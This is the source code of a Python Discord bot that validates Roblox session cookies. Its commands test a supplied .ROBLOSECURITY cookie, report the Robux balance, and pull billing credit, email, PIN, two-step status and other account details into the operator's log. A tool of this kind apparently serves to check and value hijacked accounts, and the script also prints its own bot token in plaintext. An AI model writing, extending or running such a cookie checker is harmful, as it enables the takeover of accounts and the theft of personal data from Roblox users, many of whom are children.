import os
import discord
import requests
from discord.ext import commands
from discord import Activity, ActivityType, Embed, Intents
from requests import get
from discord.ext import commands
from datetime import datetime
from time import time as __, sleep as zzz
from re import findall
from keepalive import keep_alive  # Import the keep_alive function

def log(text, sleep=None): 
    print(f"[{datetime.utcfromtimestamp(__()).strftime('%Y-%m-%d %H:%M:%S')}] → {text}")
    if sleep: zzz(sleep)

class settings:
    token = os.getenv('DISCORD_BOT_TOKEN')  # Use environment variable for the bot token
    prefix = '!'  # Bot Prefix
    bot_status = '@saikitite Prefix: !'  # Bot Status
    intents = Intents.default()
    intents.message_content = True  # ✅ Fix: Allow bot to read messages
    client = commands.Bot(command_prefix=prefix, intents=intents)

log(f'Detected token: {settings.token}', 0.5)
log(f'Detected prefix: {settings.prefix}', 0.5)
log(f'Detected bot status: {settings.bot_status}', 0.5)

@settings.client.event
async def on_ready():
    log(f"Connected to {settings.client.user}", 0.5)
    await settings.client.change_presence(activity=Activity(type=ActivityType.watching, name=settings.bot_status))



@settings.client.command()
async def vc(ctx, cookie=None):
    if not cookie:
        await ctx.send(embed=Embed(title=":x: Missing Cookie", color=0xFF0000))
        log(f'User {ctx.author} tried to use {settings.prefix}vc but did not provide a cookie.')
        return

    await ctx.message.delete()
    headers = {"User-Agent": "Mozilla/5.0"}  # ✅ Fix: Add User-Agent header
    response = get('https://users.roblox.com/v1/users/authenticated', cookies={'.ROBLOSECURITY': cookie}, headers=headers)

    if response.status_code == 200 and '"id":' in response.text:
        log(f'User {ctx.author} used {settings.prefix}vc with a valid cookie.')
        embedVar = Embed(title=":white_check_mark: Valid Cookie", color=0x38d13b)
        embedVar.add_field(name="Passed Cookie: ", value='```                       Hidden                  ```', inline=False)
        embedVar.set_footer(text="Check your DMs for the cookie.")
        dm = await ctx.author.create_dm()
        await dm.send(embed=Embed(title=":white_check_mark: Cookie", description=f'```{cookie}```', color=0x38d13b))
        await ctx.send(embed=embedVar)
    elif response.status_code == 401:  # ✅ Fix: Check for 401 Unauthorized response
        log(f'User {ctx.author} used {settings.prefix}vc with an invalid cookie.')
        embedVar = Embed(title=":x: Invalid Cookie", color=0xFF0000)
        embedVar.add_field(name="Passed Cookie: ", value='```                       Hidden                  ```', inline=False)
        await ctx.send(embed=embedVar)
    else:
        log(f'User {ctx.author} used {settings.prefix}vc but Roblox returned an error.')
        embedVar = Embed(title=":x: Error", color=0xFFFF00)
        embedVar.add_field(name="Error: ", value=f'```{response.text}```', inline=False)
        await ctx.send(embed=embedVar)

@settings.client.command()
async def vcr(ctx, cookie=None):
    if not cookie:
        await ctx.send(embed=Embed(title=":x: Missing Cookie", color=0xFF0000))
        log(f'User {ctx.author} tried to use {settings.prefix}vcr but did not provide a cookie.')
        return

    await ctx.message.delete()
    headers = {"User-Agent": "Mozilla/5.0"}  # ✅ Fix: Add User-Agent header
    response = get('https://users.roblox.com/v1/users/authenticated', cookies={'.ROBLOSECURITY': cookie}, headers=headers)

    if response.status_code == 200 and '"id":' in response.text:
        log(f'User {ctx.author} used {settings.prefix}vcr with a valid cookie.')
        user_id = response.json().get('id', None)
        if user_id:
            robux_response = get(f'https://economy.roblox.com/v1/users/{user_id}/currency', cookies={'.ROBLOSECURITY': cookie}, headers=headers)
            if robux_response.status_code == 200:
                robux = robux_response.json().get('robux', 0)
                embedVar = Embed(title=":white_check_mark: Valid Cookie", color=0x38d13b)
                embedVar.add_field(name="Passed Cookie: ", value='```                       Hidden                  ```', inline=False)
                embedVar.add_field(name=":money_mouth: Robux", value=str(robux), inline=True)
                dm = await ctx.author.create_dm()
                await dm.send(embed=Embed(title=":white_check_mark: Cookie", description=f'```{cookie}```', color=0x38d13b))
                await ctx.send(embed=embedVar)
            else:
                embedVar = Embed(title=":x: Failed to retrieve Robux", color=0xFF0000)
                await ctx.send(embed=embedVar)
        else:
            embedVar = Embed(title=":x: Failed to retrieve user ID", color=0xFF0000)
            await ctx.send(embed=embedVar)
    elif response.status_code == 401:  # ✅ Fix: Check for 401 Unauthorized response
        log(f'User {ctx.author} used {settings.prefix}vcr with an invalid cookie.')
        embedVar = Embed(title=":x: Invalid Cookie", color=0xFF0000)
        embedVar.add_field(name="Passed Cookie: ", value='```                       Hidden                  ```', inline=False)
        await ctx.send(embed=embedVar)
    else:
        log(f'User {ctx.author} used {settings.prefix}vcr but Roblox returned an error.')
        embedVar = Embed(title=":x: Error", color=0xFFFF00)
        embedVar.add_field(name="Error: ", value=f'```{response.text}```', inline=False)
        await ctx.send(embed=embedVar)



@settings.client.tree.command(name="full", description="Get full account details using a Roblox cookie")
async def full(interaction: discord.Interaction, cookie: str):
    await interaction.response.defer()

    headers = {'Cookie': f'.ROBLOSECURITY={cookie}'}

    # Check authentication
    response = requests.get('https://users.roblox.com/v1/users/authenticated', headers=headers)
    
    if response.status_code == 200 and 'id' in response.json():
        user_id = response.json().get('id')

        robux = requests.get(f'https://economy.roblox.com/v1/users/{user_id}/currency', headers=headers).json().get('robux', 'N/A')

        balance_credit_info = requests.get('https://billing.roblox.com/v1/credit', headers=headers)
        balance_credit = balance_credit_info.json().get('balance', 'N/A')
        balance_credit_currency = balance_credit_info.json().get('currencyCode', 'N/A')

        account_settings = requests.get('https://www.roblox.com/my/settings/json', headers=headers).json()

        account_name = account_settings.get('Name', 'N/A')
        account_display_name = account_settings.get('DisplayName', 'N/A')
        account_email_verified = account_settings.get('IsEmailVerified', False)
        user_email = account_settings.get('UserEmail', 'N/A')

        if account_email_verified:
            account_email_verified = f'True (`{user_email}`)'
        else:
            account_email_verified = 'False'

        account_above_13 = account_settings.get('IsUserAbove13', 'N/A')
        account_age_in_years = round(float(account_settings.get('AccountAgeInDays', 0)) / 365, 2)
        account_has_premium = account_settings.get('IsPremium', False)
        account_has_pin = account_settings.get('IsAccountPinEnabled', False)
        account_2step = account_settings.get('MyAccountSecurityModel', {}).get('2StepVerificationEnabled', 'N/A')

        account_friends = account_settings.get('FriendCount', 'N/A')
        account_gamepasses_value = account_settings.get('GamePassesValue', 'N/A')
        account_badges = account_settings.get('BadgesCount', 'N/A')
        account_sales_of_goods = account_settings.get('SalesOfGoods', 'N/A')
        account_premium_payouts_total = account_settings.get('PremiumPayoutsTotal', 'N/A')
        account_commissions = account_settings.get('Commissions', 'N/A')
        account_robux_purchased = account_settings.get('RobuxPurchased', 'N/A')
        account_pending_robux = account_settings.get('PendingRobux', 'N/A')
        account_purchases_total = account_settings.get('PurchasesTotal', 'N/A')
        account_voice_verified = account_settings.get('IsVoiceVerified', False)

        log_message = (f'User {interaction.user} used /full with a valid cookie. '
                       f'[{robux} R$ | {balance_credit} {balance_credit_currency} | {account_name} ({account_display_name}) | '
                       f'{account_age_in_years} years | {account_friends} Friends | {account_gamepasses_value} Gamepasses Worth | '
                       f'{account_badges} Badges | {account_sales_of_goods} Sales of Goods | {account_premium_payouts_total} Premium Payouts | '
                       f'{account_commissions} Commissions | {account_robux_purchased} Robux Purchased | {account_pending_robux} Pending | '
                       f'{account_purchases_total} Overall | {account_voice_verified} Voice Verified | {account_has_pin} Has PIN | '
                       f'{account_2step} 2-Step Verification | {account_has_premium} Premium | {account_above_13} Above 13 | '
                       f'{account_email_verified} Email]')

        print(log_message)  # Use a proper logging function if needed

        await interaction.followup.send("Account details retrieved successfully.")
    else:
        await interaction.followup.send("Invalid cookie or unable to retrieve account details.")


        
def run_bot():
    settings.client.run(settings.token)

# Start the keep-alive server
keep_alive()

# Start the bot
run_bot()
